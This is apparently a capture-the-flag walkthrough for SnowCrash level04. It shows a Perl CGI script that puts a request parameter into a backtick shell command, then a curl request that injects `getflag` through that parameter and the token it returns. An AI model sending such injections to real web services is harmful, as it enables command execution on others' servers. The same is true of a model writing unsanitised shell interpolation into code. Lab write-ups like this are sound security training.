```
level04@SnowCrash:~$ ls
level04.pl

level04@SnowCrash:~$ perl level04.pl 
Content-type: text/html



level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

The perl script uses a CGI (Common Gateway Interface) protocol to communicate to the web server on port 4747.

Sub x is a function that prints the parameter x.  

So let's put getflag as the parameter and use curl to get the main page from the web server and see the result:

```
level04@SnowCrash:~$ curl 'localhost:4747?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```